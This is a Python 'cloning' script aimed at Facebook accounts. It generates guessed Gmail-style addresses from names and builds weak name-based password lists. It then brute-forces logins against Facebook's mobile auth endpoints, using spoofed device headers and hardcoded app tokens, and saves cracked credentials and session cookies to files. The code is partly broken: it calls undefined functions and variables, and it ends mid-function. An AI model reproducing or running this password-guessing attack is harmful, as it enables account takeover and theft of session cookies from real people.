from os import path
import os,base64,zlib,pip,urllib
from os import path
import os,base64,zlib,pip,urllib
try:
        import os,requests,json,time,re,random,sys,uuid,string,subprocess
        from string import *
        from concurrent.futures import ThreadPoolExecutor as tred
except ModuleNotFoundError:
        os.system(f'pip install requests futures==2 > /dev/null')
except:pass
fbks=(f'com.facebook.adsmanager','com.facebook.lite','com.facebook.orca','com.facebook.katana','com.facebook.mlite')
print('[•] Join Our Group')
os.system('xdg-open https://facebook.com/groups/1112513112953691/')
try:
	import os,requests,json,time,re,random,sys,uuid,string,subprocess
	from string import *
	import bs4
	from concurrent.futures import ThreadPoolExecutor as tred
	from bs4 import BeautifulSoup as sop
	from bs4 import BeautifulSoup
except ModuleNotFoundError: 
	print('\n Installing missing modules ...')
	os.system('pip install requests bs4 futures==2 > /dev/null')
	os.system('python CRACK.py')
print('\n\033[1;31m Cheking Server...');time.sleep(3)

logo=("""\033[1;37m                                                                                 
  \x1b[1;97m$$$$$$\  $$\       $$$$$$$\  $$\   $$\   $$$$$$\ 
 \x1b[1;97m$$  __$$\ $$ |      $$  __$$\ $$ |  $$ | $$  __$$\ 
 \x1b[1;97m$$ /  $$ |$$ |      $$ |  $$ |$$ |  $$ | $$ /  $$ | 
 \x1b[1;97m$$$$$$$$ |$$ |      $$$$$$$  |$$$$$$$$ | $$$$$$$$   
 \x1b[1;97m$$  __$$ |$$ |      $$  ____/ $$  __$$ | $$  __$$ | \033[1;91mH
\x1b[1;97m $$ |  $$ |$$ |      $$ |      $$ |  $$ | $$ |  $$ | \033[1;91mA
\x1b[1;97m $$ |  $$ |$$$$$$$$\ $$ |      $$ |  $$ | $$ |  $$ | \033[1;91mC
\x1b[1;97m \__|  \__|\________|\__|      \__|  \__| \__|  \__| \033[1;91mK
\x1b[1;97m____________________________________________________
[✓] DEVELOPERS : HAJI BASIR \033[1;31m&\033[1;37m HAJI NAWEED
[✓] FACEBOOK   : TERMUX COMMANDS BY ALPHA HACK TM
[✓] TEAM       : ALPHA ISLAMIC TM 
[✓] STATUS     : FREE
[✓] VERSION    : 0.1
\033[1;37m____________________________________________________
""")
def linex():
	print('\033[1;37m____________________________________________________')
def clear():
	os.system('clear')
	print(logo)
A = '\x1b[1;97m' 
B = '\x1b[1;96m' 
C = '\x1b[1;91m' 
D = '\x1b[1;92m'
M = '\033[1;31m'
H = '\033[1;32m'
N = '\x1b[1;37m'	
E = '\x1b[1;93m' 
F = '\x1b[1;94m'
G = '\x1b[1;95m'
P = '\033[1;37m'
loop=0
oks=[]
cps=[]
pcp=[]
id=[]
tokenku=[]
def menu():
			clear()
			print('\033[1;37m____________________________________________________')
			print('\033[1;97m[1] FILE CLONING \n\033[1;97m[2] CREATE FILE \n\033[1;97m[3] PUBLIC CLONEING \n\033[1;97m[4] RANDOM CLONING \n\033[1;97m[5] GMAIL CLONING  \n\033[1;97m[6] CONTACT WITH ADMIN  \n\033[1;97m[7]\033[1;91mEXIT')
			print('\033[1;37m____________________________________________________')
			xd=input(' CHOOSE : ')
			if xd in ['4','04']:
				afghan()
			if xd in ['05','5']:
				gmail()
			if xd in ['07','7']:
				os.system('xdg-open  https://www.facebook.com/RoLix.OffiCail.AcCount4k')
				print('\033[1;37m')
				print('\033[1;37m____________________________________________________')
				print(' The process has completed')
				print(' Total OK/CP: '+str(len(oks))+'/'+str(len(cps)))
				print('\033[1;37m____________________________________________________')
				input(' Press enter to back ')
				os.system('python CRACK.py')
				
				exit()
				menu()
			elif xd in ['0','00']:
				exit(' Thanks ')
			else:
				exit(' OPTION NOT FOUND ...')
				
def gmail():
		os.system('rm -rf .re.txt')
		clear()
		print('\033[1;37m EXAMPLE : ahmad, ali, amir, mohammad\033[1;97m')
		print('\033[1;37m____________________________________________________')
		first = input(' PUT FIRST NAME : ')
		print('\033[1;37m____________________________________________________')
		print('\033[1;37m____________________________________________________')
		print('\033[1;37m EXAMPLE : afghan, ahmadi, karimi \033[1;97m')
		print('\033[1;37m____________________________________________________')
		print('\033[1;37m____________________________________________________')
		last = input(' PUT LAST NAME : ')
		print('\033[1;37m____________________________________________________')
		print(' EXAMPLE : @gmail.com ')
		print('\033[1;37m____________________________________________________')
		domain = input(' domain: ')
		try:
			limit=int(input(' PUT LIMIT : '))
		except ValueError:
			limit = 5000
		clear()
		print(' [1] ONLY NAME PASSWORD \n [2] NAME + DIGITS PASSWORD \n [3] CAPITAL NAME PASSWORD \n [4] AUTO ALL PASSWORD')
		print('\033[1;37m____________________________________________________')
		pxc = input(' CHOOSE : ')
		clear()
		print('\033[1;37m [1] \033[1;33mMethod   (best) \033[1;37m \n [2] \033[1;33mMethod   (v-fast)  \033[1;37m \n [3] \033[1;33mMethod   (v-best)  \033[1;37m \n [4] \033[1;33mMethod   (slow) \033[1;37m \n [5] \033[1;33mMethod   (slow)  \033[1;37m \n [6] \033[1;33mMethod   (slow) ')
		print('\033[1;37m____________________________________________________')
		mthd = input(' Choose: ')
		print(' Getting gmails...')
		lists = ['3','4']
		for xd in range(limit):
			lchoice = random.choice(lists)
			if '3' in lchoice:
				mail = ''.join(random.choice(string.digits) for _ in range(3))
				open('.re.txt','a').write(first.lower()+last.lower()+mail+domain+'|'+first+' '+last+'\n')
			else:
				mail = ''.join(random.choice(string.digits) for _ in range(4))
				open('.re.txt','a').write(first.lower()+last.lower()+mail+domain+'|'+first+' '+last+'\n')
			fo = open('.re.txt', 'r').read().splitlines()
		with tred(max_workers=30) as TRT:
			total = str(len(fo))
			clear()
			print(' Total ids : \033[1;32m'+total+f' ')
			print(' \033[1;37mThe process is running in the background')
			linex()
			for user in fo:
				ids,names = user.split('|')
				first_name = names.rsplit(' ')[0]
				try:
					last_name = names.rsplit(' ')[1]
				except IndexError:
					last_name = 'Khan'
				fs = first_name.lower()
				ls = last_name.lower()
				if pxc in ['1','01']:
					passlist = [fs+ls,fs+' '+ls,fs]
				elif pxc in ['2','02']:
					passlist = [fs+ls,fs+' '+ls,fs+'123',fs+'12345',fs+'1122']
				elif pxc in ['3','03']:
					passlist = [first_name+last_name,first_name+' '+last_name,first_name+'123']
				else:
					passlist = [fs+ls,fs+' '+ls,first_name+last_name,first_name+' '+last_name,fs+'123',fs+'786',fs+'12345',fs+'1122']
				if mthd in ['1','01']:
					TRT.submit(trt1,ids,passlist)
				if mthd in ['2','02']:
					TRT.submit(trt2,ids,passlist)
				if mthd in ['3','03']:
					TRT.submit(trt3,ids,passlist)
				if mthd in ['4','04']:
					TRT.submit(trt4,ids,passlist)
				if mthd in ['5','05']:
					TRT.submit(trt5,ids,passlist)
				if mthd in ['6','06']:
					TRT.submit(trt6,ids,passlist)
		print('\033[1;37m')
		linex()
		print(' The process has completed')
		print(' Total OK/CP: '+str(len(oks))+'/'+str(len(cps)))
		linex()
		input(' Press enter to back ')
		os.system('python trt.py')
		
#b-api method
#1method
def api1(ids,names,passlist):
		try:
			global ok,loop
			sys.stdout.write('\r\r\033[1;37m [TRT-M1] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
			fn = names.split(' ')[0]
			try:
				ln = names.split(' ')[1]
			except:
				ln = fn
			for pw in passlist:
				pas = pw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',names).replace('name',names.lower())
				
				application_version = str(random.randint(111,555))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(111,555))
				application_version_code=str(random.randint(000000000,999999999))
				__iam_genius = random.choice(android_models)
				phone_model = __iam_genius.split('|')[0]
				phone_company = __iam_genius.split('|')[1]
				dimensions = __iam_genius.split('|')[2]
				ffb=random.choice(fbks)
				dvlk = random.choice(usr)
				ua_string = f'{str(dvlk)} [FBAN/FB4A;FBAV/{str(application_version)};FBPN/com.facebook.katana;FBLC/en_PK;FBCR/null;FBBV/{str(application_version_code)};FBMF/{str(phone_company)};FBBD/{str(phone_company)};FBDV/{str(phone_company)};FBSV/8.1.0;;FBDM/'+'{density=2.75,height=1440,width=720};]'
				li = ['28','29','210']
				li2 = random.choice(li)
				j1 = ''.join(random.choice(digits) for _ in range(2))
				j2 = li2+j1
				device_family_id = str(uuid.uuid4())
				adid = str(uuid.uuid4())
				machine_id = ''.join(random.choice(ascii_uppercase+ascii_lowercase+digits+'_') for _ in range(24))
				data = {'adid':adid,
				'format':'json',
				'device_id':device_family_id,
				'email':ids,
				'password':pas,
				'generate_analytics_claim':'1',
				'community_id':'','cpl':'true','try_num':'1',
				'family_device_id':device_family_id,
				'credentials_type':'device_based_login_password',
				'generate_session_cookies':'1',
				'error_detail_type':'button_with_disabled',
				'source':'device_based_login',
				'machine_id':machine_id,
				'login_location_accuracy_m':'1.0',
				'meta_inf_fbmeta':'',
				'advertiser_id':adid,
				'encrypted_msisdn':'',
				'currently_logged_in_userid':'0',
				'locale':'en_PK',
				'client_country_code':'PK',
				'method':'auth.login',
				'fb_api_req_friendly_name':'authenticate',
				'fb_api_caller_class':'com.facebook.account.login.protocol.Fb4aAuthHandler',
				'access_token':'350685531728|62f8ce9f74b12f84c123cc23437a4a32'}
				head = {
				'content-type':'application/x-www-form-urlencoded',
				'x-fb-sim-hni':str(random.randint(2e4,4e4)),
				'x-fb-connection-type':'unknown',
				'Authorization':'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32',
				'user-agent':ua_string,
				'x-fb-net-hni':str(random.randint(2e4,4e4)),
				'x-fb-connection-bandwidth':str(random.randint(2e7,3e7)),
				'x-fb-connection-quality':'EXCELLENT',
				'x-fb-friendly-name':'authenticate',
				'accept-encoding':'gzip, deflate',
				'x-fb-http-engine':	'Liger'}
				url = 'https://b-api.facebook.com/method/auth.login'
				po = requests.post(url,data=data,headers=head,allow_redirects=False).text
				q = json.loads(po)
				if 'session_key' in q:
					print('\r\r\033[1;32m [TRT-OK] '+ids+' | '+pas+'\033[1;97m')
					open('/sdcard/TRT-OK.txt','a').write(ids+'|'+pas+'\n')
					oks.append(ids)
					break
				elif 'www.facebook.com' in q['error_msg']:
					if 'y' in pcp:
						print('\r\r\x1b[38;5;205m [TRT-CP] '+ids+' | '+pas+'\033[1;97m')
						open('/sdcard/TRT-CP.txt','a').write(ids+'|'+pas+'\n')
						cps.append(ids)
						break
					else:
						open('/sdcard/TRT-CP.txt','a').write(ids+'|'+pas+'\n')
						break
				else:
					continue
			loop+=1
		except requests.exceptions.ConnectionError:
			time.sleep(10)
		except Exception as e:
			pass
#m2
#b-graph method		
def api2(ids,names,passlist):
        try:
                global ok,loop,sim_id
                sys.stdout.write('\r\r\033[1;37m [TRT-M2] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                fn = names.split(' ')[0]
                try:
                        ln = names.split(' ')[1]
                except:
                        ln = fn
                for pw in passlist:
                        pas = pw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',names).replace('name',names.lower())
                        accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
                        fbav = f'{random.randint(111,999)}.0.0.{random.randint(11,99)}.{random.randint(111,999)}'
                        fbbv = str(random.randint(111111111,999999999))
                        android_version = device['android_version']
                        model = device['model']
                        build = device['build']
                        fblc = device['fblc']
                        fbcr = sim_id
                        fbmf = device['fbmf']
                        fbbd = device['fbbd']
                        fbdv = device['fbdv']
                        fbsv = device['fbsv']
                        fbca = device['fbca']
                        fbdm = device['fbdm']
                        fbfw = '1'
                        fbrv = '0'
                        fban = 'FB4A'
                        fbpn = 'com.facebook.katana'
                        en = random.choice(['en_US','en_GB'])
                        cph = random.choice(['CPH1979','CPH1983','CPH1987','CPH2005','CPH2009','CPH2015','CPH2059','CPH2061','CPH2065','CPH2069','CPH2071','CPH2073','CPH2077','CPH2091','CPH2095','CPH2099','CPH2137','CPH2139','CPH2145','CPH2161','CPH2185','CPH2201','CPH2209','CPH1801','CPH1803','CPH1805','CPH1809','CPH1827','CPH1837','CPH1851','CPH1853'])
                        network = random.choice(['Zong','null','Marshmallow','Telekom China'])
                        ua ='Davik/2.1.0 (Linux; U; Android 7.0.0; MMB29K Build/GT-P5100 [FBAN/FB4A;FBAV/241.0.0.41292;FBBV/975202462;FBDM/{density=2.75,width=720,height=9398};FBLC/pl_PL;FBCR/T-Mobile.pl;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.mlite;FBDV/MMB29K;FBSV/4.4.4;nullFBCA/armeabi-v7a:armeabi;]'
                        random_seed = random.Random()
                        adid = str(''.join(random_seed.choices(string.hexdigits, k=16)))
                        device_id = str(uuid.uuid4())
                        secure = str(uuid.uuid4())
                        family = str(uuid.uuid4())
                        accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
                        xd =str(''.join(random_seed.choices(string.digits, k=20)))
                        sim_serials = f'["{xd}"]'
                        li = ['28','29','210']
                        li2 = random.choice(li)
                        j1 = ''.join(random.choice(digits) for _ in range(2))
                        jazoest = li2+j1
                        data={"adid": str(uuid.uuid4()),"format": "json","device_id": str(uuid.uuid4()),"cpl": "true","family_device_id": str(uuid.uuid4()),"credentials_type": "device_based_login_password","error_detail_type": "button_with_disabled","source": "device_based_login","email":ids,"password":pas,"access_token":"350685531728|62f8ce9f74b12f84c123cc23437a4a32","generate_session_cookies":"1","meta_inf_fbmeta": "","advertiser_id": str(uuid.uuid4()),"currently_logged_in_userid": "0","locale": "en_US","client_country_code": "US","method": "auth.login","fb_api_req_friendly_name": "authenticate","fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler","api_key": "882a8490361da98702bf97a021ddc14d"}
                        headers = {"Content-Type": "application/x-www-form-urlencoded","Host": "graph.facebook.com","User-Agent": ua,"X-FB-Net-HNI": "45204","X-FB-SIM-HNI": "45201","X-FB-Connection-Type": "MOBILE.LTE","X-Tigon-Is-Retry": "False","x-fb-session-id": "nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62","x-fb-device-group": "5120","X-FB-Friendly-Name": "ViewerReactionsMutation","X-FB-Request-Analytics-Tags": "graphservice","Accept-Encoding": "gzip, deflate","X-FB-HTTP-Engine": "Liger","X-FB-Client-IP": "True","X-FB-Server-Cluster": "True","x-fb-connection-token": "d29d67d37eca387482a8a5b740f84f62","Connection": "Keep-Alive"}
                        url = 'https://b-graph.facebook.com/auth/login'
                        twf = 'Login approval'+'s are on. '+'Expect an SMS'+' shortly with '+'a code to use'+' for log in'
                        po = requests.post(url,data=data,headers=headers).json()
                        if 'session_key' in po:
                                        print('\r\r\033[1;32m [TRT-OK] '+ids+' | '+pas+'\033[1;97m')
                                        coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                        #print("\r\r\033[1;33m Cookie: "+coki)
                                        open('/sdcard/TRT-COKIE.txt','a').write(ids+'|'+pas+ ' | ' +coki+'\n')
                                        open('/sdcard/TRT-OK.txt','a').write(ids+'|'+pas+'\n')
                                        oks.append(ids)
                                        break
                        elif twf in str(po):
                                        if 'y' in pcp:
                                                print('\r\r \033[1;34m[TRT-2F] '+ids+' | '+pas)
                                                twf.append(ids)
                                                break
                        elif 'www.facebook.com' in po['error']['message']:
                                        if 'y' in pcp:
                                                print('\r\r\x1b[38;5;205m [TRT-CP] '+ids+' | '+pas+'\033[1;97m')
                                                open('/sdcard/TRT-CP.txt','a').write(ids+'|'+pas+'\n')
                                                break
                                                cps.append(ids)
                                        else:
                                                open('/sdcard/TRT-CP.txt','a').write(ids+'|'+pas+'\n')
                                                break
                                                cps.append(ids)
                        else:
                                        continue
                loop+=1
        except Exception as e:
                pass
  #method3             
def api3(ids,names,passlist):
        try:
                global ok,loop,sim_id
                sys.stdout.write('\r\r\033[1;37m [TRT-M3] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                fn = names.split(' ')[0]
                try:
                        ln = names.split(' ')[1]
                except:
                        ln = fn
                for pw in passlist:
                        pas = pw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',names).replace('name',names.lower())
                        accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
                        fbav = f'{random.randint(111,999)}.0.0.{random.randint(11,99)}.{random.randint(111,999)}'
                        fbbv = str(random.randint(111111111,999999999))
                        android_version = device['android_version']
                        model = device['model']
                        build = device['build']
                        fblc = device['fblc']
                        fbcr = sim_id
                        fbmf = device['fbmf']
                        fbbd = device['fbbd']
                        fbdv = device['fbdv']
                        fbsv = device['fbsv']
                        fbca = device['fbca']
                        fbdm = device['fbdm']
                        fbfw = '1'
                        fbrv = '0'
                        fban = 'FB4A'
                        fbpn = 'com.facebook.katana'
                        ua = 'Davik/2.1.0 (Linux; U; Android '+android_version+'.0.1; '+model+' Build/'+build+') [FBAN/'+fban+';FBAV/'+fbav+';FBBV/'+fbbv+';FBDM/{density=3.0,width=1440,height=8797};FBLC/'+fblc+';FBRV/'+str(random.randint(000000000,999999999))+';FBCR/'+fbcr+';FBMF/'+fbmf+';FBBD/'+fbbd+';FBPN/'+fbpn+';FBDV/'+fbdv+';FBSV/'+fbsv+';FBOP/19;FBCA/'+fbca+';]'
                        random_seed = random.Random()
                        adid = str(''.join(random_seed.choices(string.hexdigits, k=16)))
                        device_id = str(uuid.uuid4())
                        secure = str(uuid.uuid4())
                        family = str(uuid.uuid4())
                        accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
                        xd =str(''.join(random_seed.choices(string.digits, k=20)))
                        sim_serials = f'["{xd}"]'
                        li = ['28','29','210']
                        li2 = random.choice(li)
                        j1 = ''.join(random.choice(digits) for _ in range(2))
                        jazoest = li2+j1
                        data = {
                                "adid": adid,
"format": "json",
"device_id": str(uuid.uuid4()),
"email": ids,
"password": pas,
"generate_analytics_claims": "1",
"credentials_type": "password",
"source": "login",
"error_detail_type": "button_with_disabled",
"enroll_misauth": "false",
"generate_session_cookies": "1",
"generate_machine_id": "1",
"fb_api_req_friendly_name": "authenticate",}
                        headers={
                                "Accept-Encoding": "gzip, deflate",
"Accept": "*/*",
"Connection": "keep-alive",
"User-Agent": ua,
"Authorization": "OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32",
"X-FB-Friendly-Name": "authenticate",
"X-FB-Connection-Type": "unknown",
"Content-Type": "application/x-www-form-urlencoded",
"X-FB-HTTP-Engine": "Liger",
"Content-Length": "329",}
                        url = 'https://b-graph.facebook.com/auth/login'
                        twf = 'Login approval'+'s are on. '+'Expect an SMS'+' shortly with '+'a code to use'+' for log in'
                        po = requests.post(url,data=data,headers=headers).json()
                        if 'session_key' in po:
                                        print('\r\r\033[1;32m [TRT-OK] '+ids+' | '+pas+'\033[1;97m')
                                        coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                        print("Cookie: "+coki)
                                        open('/sdcard/TRT-COOKIE.txt','a').write(coki+'\n')
                                        open('/sdcard/TRT-OK.txt','a').write(ids+'|'+pas+'\n')
                                        oks.append(ids)
                                        break
                        elif twf in str(po):
                                        if 'y' in pcp:
                                                print('\r\r \033[1;34m[TRT-2F] '+ids+' | '+pas)
                                                twf.append(ids)
                                                break
                        elif 'www.facebook.com' in po['error']['message']:
                                        if 'y' in pcp:
                                                print('\r\r\x1b[38;5;205m [TRT-CP] '+ids+' | '+pas+'\033[1;97m')
                                                open('/sdcard/TRT-CP.txt','a').write(ids+'|'+pas+'\n')
                                                break
                                                cps.append(ids)
                                        else:
                                                open('/sdcard/TRT-CP.txt','a').write(ids+'|'+pas+'\n')
                                                break
                                                cps.append(ids)
                        else:
                                        continue
                loop+=1
        except Exception as e:
                pass
#b-api method
#method3                
def api4(ids,names,passlist):
        try:
                global ok,loop,sim_id
                sys.stdout.write('\r\r\033[1;37m [TRT-M4] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                fn = names.split(' ')[0]
                try:
                        ln = names.split(' ')[1]
                except:
                        ln = fn
                for pw in passlist:
                        pas = pw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',names).replace('name',names.lower())
                        accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
                        fbav = f'{random.randint(111,999)}.0.0.{random.randint(11,99)}.{random.randint(111,999)}'
                        fbbv = str(random.randint(111111111,999999999))
                        android_version = device['android_version']
                        model = device['model']
                        build = device['build']
                        fblc = device['fblc']
                        fbcr = sim_id
                        fbmf = device['fbmf']
                        fbbd = device['fbbd']
                        fbdv = device['fbdv']
                        fbsv = device['fbsv']
                        fbca = device['fbca']
                        fbdm = device['fbdm']
                        fbfw = '1'
                        fbrv = '0'
                        fban = 'FB4A'
                        fbpn = 'com.facebook.katana'
                        ua = 'Davik/2.1.0 (Linux; U; Android '+android_version+'.0.1; '+model+' Build/'+build+') [FBAN/'+fban+';FBAV/'+fbav+';FBBV/'+fbbv+';FBDM/{density=3.0,width=1080,height=2376};FBLC/'+fblc+';FBRV/'+str(random.randint(000000000,999999999))+';FBCR/'+fbcr+';FBMF/'+fbmf+';FBBD/'+fbbd+';FBPN/'+fbpn+';FBDV/'+fbdv+';FBSV/'+fbsv+';FBOP/19;FBCA/'+fbca+';]'
                        random_seed = random.Random()
                        adid = str(''.join(random_seed.choices(string.hexdigits, k=16)))
                        device_id = str(uuid.uuid4())
                        secure = str(uuid.uuid4())
                        family = str(uuid.uuid4())
                        accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
                        xd =str(''.join(random_seed.choices(string.digits, k=20)))
                        sim_serials = f'["{xd}"]'
                        li = ['28','29','210']
                        li2 = random.choice(li)
                        j1 = ''.join(random.choice(digits) for _ in range(2))
                        jazoest = li2+j1
                        data = {
                                'adid':adid,
                                'format':'json',
                                'device_id':device_id,
                                'email':ids,
                                'password':pas,
                                'generate_analytics_claims':'1',
                                'credentials_type':'password',
                                'source':'login',
                                'error_detail_type':'button_with_disabled',
                                'enroll_misauth':'false',
                                'generate_session_cookies':'1',
                                'generate_machine_id':'1',
                                'meta_inf_fbmeta':'',
                                'currently_logged_in_userid':'0',
                                'fb_api_req_friendly_name':'authenticate',
                        }
                        headers={
                                'Authorization':f'OAuth {accessToken}',
                                'X-FB-Friendly-Name':'authenticate',
                                'X-FB-Connection-Type':'unknown',
                                'User-Agent':ua,
                                'Accept-Encoding':'gzip, deflate',
                                'Content-Type': 'application/x-www-form-urlencoded',
                                'X-FB-HTTP-Engine': 'Liger'
                                }
                        url = 'https://b-api.facebook.com/method/auth.login'
                        twf = 'Login approval'+'s are on. '+'Expect an SMS'+' shortly with '+'a code to use'+' for log in'
                        po = requests.post(url,data=data,headers=headers).json()
                        if 'session_key' in po:
                                        print('\r\r\033[1;32m [TRT-OK] '+ids+' | '+pas+'\033[1;97m')
                                        open('/sdcard/TRT-OK.txt','a').write(ids+'|'+pas+'\n')
                                        oks.append(ids)
                                        break
                        elif twf in str(po):
                                        if 'y' in pcp:
                                                print('\r\r \033[1;34m[TRT-2F] '+ids+' | '+pas)
                                                twf.append(ids)
                                                break
                        elif 'www.facebook.com' in po['error_msg']:
                                        if 'y' in pcp:
                                                print('\r\r\x1b[38;5;206m [TRT-CP] '+ids+' | '+pas+'\033[1;97m')
                                                open('/sdcard/TRT-CP.txt','a').write(ids+'|'+pas+'\n')
                                                break
                                                cps.append(ids)
                                        else:
                                                open('/sdcard/TRT-CP.txt','a').write(ids+'|'+pas+'\n')
                                                break
                                                cps.append(ids)
                        else:
                                continue
                loop+=1
        except Exception as e:
                pass
#4method
def api5(ids,names,passlist):
        try:
                global ok,loop,sim_id
                sys.stdout.write('\r\r\033[1;37m [TRT-M5] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                fn = names.split(' ')[0]
                try:
                        ln = names.split(' ')[1]
                except:
                        ln = fn
                for pw in passlist:
                        pas = pw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',names).replace('name',names.lower())
                        accessToken = ['350685531728|62f8ce9f74b12f84c123cc23437a4a32',
'438142079694454|fc0a7caa49b192f64f6f5a6d9643bb28',	'6628568379|c1e620fa708a1d5696fb991c1bde5662','1479723375646806|afb3e4a6d8b868314cc843c21eebc6ae']
                        fbav = f'{random.randint(111,999)}.0.0.{random.randint(11,99)}.{random.randint(111,999)}'
                        fbbv = str(random.randint(111111111,999999999))
                        android_version = device['android_version']
                        model = device['model']
                        build = device['build']
                        fblc = device['fblc']
                        fbcr = sim_id
                        fbmf = device['fbmf']
                        fbbd = device['fbbd']
                        fbdv = device['fbdv']
                        fbsv = device['fbsv']
                        fbca = device['fbca']
                        fbdm = device['fbdm']
                        fbfw = '1'
                        fbrv = '0'
                        fban = 'FB4A'
                        fbpn = 'com.facebook.katana'
                        en = random.choice(['en_US','en_GB'])
                        cph = random.choice(['CPH1979','CPH1983','CPH1987','CPH2005','CPH2009','CPH2015','CPH2059','CPH2061','CPH2065','CPH2069','CPH2071','CPH2073','CPH2077','CPH2091','CPH2095','CPH2099','CPH2137','CPH2139','CPH2145','CPH2161','CPH2185','CPH2201','CPH2209','CPH1801','CPH1803','CPH1805','CPH1809','CPH1827','CPH1837','CPH1851','CPH1853'])
                        en = random.choice(['en_US','en_GB'])
                        network = random.choice(['Zong','null','Marshmallow','Telekom China'])
                        ua = "Davik/2.1.0 (Linux; U; Android '+fbsv+'.0.0; '+model+' Build/'+''.join(random.choice(string.ascii_uppercase + string.digits) for _ in range(6))+' [FBAN/FB4A;FBAV/'+str(random.randint(111,555))+'.0.0.'+str(random.randrange(1,19))+'.'+str(random.randint(111,555))+';FBBV/'+str(random.randint(745000000,745999999))+';FBDM/{density=2.25,width=720,height=1452};FBLC/pl_PL;FBCR/T-Mobile.pl;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.adsmanager;FBDV/'+model+';FBSV/4.4.4;nullFBCA/armeabi-v7a:armeabi;]"
                        random_seed = random.Random()
                        adid = str(''.join(random_seed.choices(string.hexdigits, k=16)))
                        device_id = str(uuid.uuid4())
                        secure = str(uuid.uuid4())
                        family = str(uuid.uuid4())
                        accessToken = ['350685531728|62f8ce9f74b12f84c123cc23437a4a32',
'438142079694454|fc0a7caa49b192f64f6f5a6d9643bb28',	'6628568379|c1e620fa708a1d5696fb991c1bde5662','1479723375646806|afb3e4a6d8b868314cc843c21eebc6ae']
                        xd =str(''.join(random_seed.choices(string.digits, k=20)))
                        sim_serials = f'["{xd}"]'
                        li = ['28','29','210']
                        li2 = random.choice(li)
                        j1 = ''.join(random.choice(digits) for _ in range(2))
                        jazoest = li2+j1
                        data = {
                                "adid": adid,
"format": "json",
"device_id": str(uuid.uuid4()),
"cpl": "true",
"family_device_id": str(uuid.uuid4()),
"credentials_type": "device_based_login_password",
"error_detail_type": "button_with_disabled",
"source": "device_based_login",
"email": ids,
"password": pas,
"access_token": "350685531728|62f8ce9f74b12f84c123cc23437a4a32",
"generate_session_cookies": "1",
"meta_inf_fbmeta": "",
"advertiser_id": "8b59ed89-4b88-4f69-a1ed-dfea59e76839",
"currently_logged_in_userid": "0",
"locale": "en_US",
"client_country_code": "US",
"method": "auth.login",
"fb_api_req_friendly_name": "authenticate",
"fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",
"api_key": "882a8490361da98702bf97a021ddc14d",}
                        headers={
                                'User-Agent': ua,
'Content-Type': 'application/x-www-form-urlencoded',
'Host': 'graph.facebook.com',
'X-FB-Net-HNI': '25227',
'X-FB-SIM-HNI': '29752',
'X-FB-Connection-Type': 'MOBILE.LTE',
'X-Tigon-Is-Retry': 'False',
'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62',
'x-fb-device-group': '5120',
'X-FB-Friendly-Name': 'ViewerReactionsMutation',
'X-FB-Request-Analytics-Tags': 'graphservice',
'X-FB-HTTP-Engine': 'Liger',
'X-FB-Client-IP': 'True',
'X-FB-Server-Cluster': 'True',
'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',
'Content-Length': '706'}
                        url = 'https://b-graph.facebook.com/auth/login'
                        twf = 'Login approval'+'s are on. '+'Expect an SMS'+' shortly with '+'a code to use'+' for log in'
                        po = requests.post(url,data=data,headers=headers).json()
                        if 'session_key' in po:
                                        print('\r\r\033[1;32m [TRT-OK] '+ids+' | '+pas+'\033[1;97m')
                                        coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                        #print("\r\r\033[1;33m Cookie: "+coki)
                                        open('/sdcard/TRT-COKIE.txt','a').write(ids+'|'+pas+ ' | ' +coki+'\n')
                                        open('/sdcard/TRT-OK.txt','a').write(ids+'|'+pas+'\n')
                                        oks.append(ids)
                                        break
                        elif twf in str(po):
                                        if 'y' in pcp:
                                                print('\r\r \033[1;34m[TRT-2F] '+ids+' | '+pas)
                                                twf.append(ids)
                                                break
                        elif 'www.facebook.com' in po['error']['message']:
                                        if 'y' in pcp:
                                                print('\r\r\x1b[38;5;205m [TRT-CP] '+ids+' | '+pas+'\033[1;97m')
                                                open('/sdcard/TRT-CP.txt','a').write(ids+'|'+pas+'\n')
                                                break
                                                cps.append(ids)
                                        else:
                                                open('/sdcard/TRT-CP.txt','a').write(ids+'|'+pas+'\n')
                                                break
                                                cps.append(ids)
                        else:
                                        continue
                loop+=1
        except Exception as e:
                pass
def api6(ids,names,passlist):
	global loop,oks,cps
	sys.stdout.write('\r\r\033[1;37m [TRT-M6] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
	session = requests.Session()
	try:
		first = names.split(' ')[0]
		try:
			last = names.split(' ')[1]
		except:
			last = 'Khan'
		ps = first.lower()
